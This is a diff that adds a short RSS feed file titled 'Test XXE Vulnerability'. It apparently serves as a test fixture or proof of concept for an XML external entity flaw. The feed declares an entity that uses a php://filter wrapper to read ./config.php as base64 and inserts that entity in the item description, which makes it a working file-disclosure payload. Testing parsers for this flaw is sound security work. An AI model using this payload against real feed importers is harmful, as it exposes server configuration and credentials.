@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE description [<!ELEMENT description ANY><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./config.php"> ]>
+<rss version="2.0">
+<channel>
+<item>
+<title>Test XXE Vulnerability</title>
+<link>http://127.0.0.1</link>
+<pubDate>Sun, 2 Jul 2013 22:56:41 GMT</pubDate>
+<description>&xxe;</description>
+</item>
+</channel>
+</rss>
